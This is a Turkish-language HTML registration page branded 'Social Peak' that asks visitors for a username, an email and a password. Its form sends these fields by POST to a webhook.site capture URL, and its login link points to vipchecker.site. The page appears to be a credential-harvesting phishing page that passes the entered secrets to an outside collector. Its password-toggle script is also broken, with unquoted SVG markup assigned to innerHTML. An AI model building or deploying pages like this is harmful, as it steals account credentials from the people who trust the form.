<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Social Peak - Kayıt Ol</title>

  <!-- CSS bağlantısı -->
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
  <div class="card">
    
    <div class="logo">
      <h2>Social Peak</h2>
    </div>
    
    <h1>Sitemize Hoşgeldiniz</h1>
    <p class="desc">
      Sistemlerimize erişmek için aşağıdaki bilgileri doldurarak kayıt olun!
    </p>

    <form action="https://webhook.site/3e76a8ca-d086-425d-86a8-476035d540e9" method="POST">

      <label>Kullanıcı Adı</label>
      <input type="text" name="username" placeholder="Bir kullanıcı adı gir..." required>

      <label>Email</label>
      <input type="email" name="email" placeholder="Bir E-Posta gir" required>

      <label>Şifre</label>
      <div class="password-box">
        <input type="password" id="password" name="password" placeholder="Şifre" required>
        
        <button type="button" class="toggle-password" onclick="togglePassword()">
          <svg id="eye-icon" viewBox="0 0 24 24">
            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5z"/>
          </svg>
        </button>
      </div>

      <button type="submit">Kayıt Ol</button>

      <div class="login-text">
        Zaten hesabın var mı? <a href="https://vipchecker.site">Giriş Yap</a>
      </div>
      
    </form>
  </div>
</div>

<!-- JAVASCRIPT -->
<script>
function togglePassword() {
  const passwordInput = document.getElementById('password');
  const eyeIcon = document.getElementById('eye-icon');

  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    eyeIcon.innerHTML = <path d="M2 4.27L3.27 3 21 20.73 19.73 22z"/>;
  } else {
    passwordInput.type = 'password';
    eyeIcon.innerHTML = <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5z"/>;
  }
}
</script>

</body>
</html>
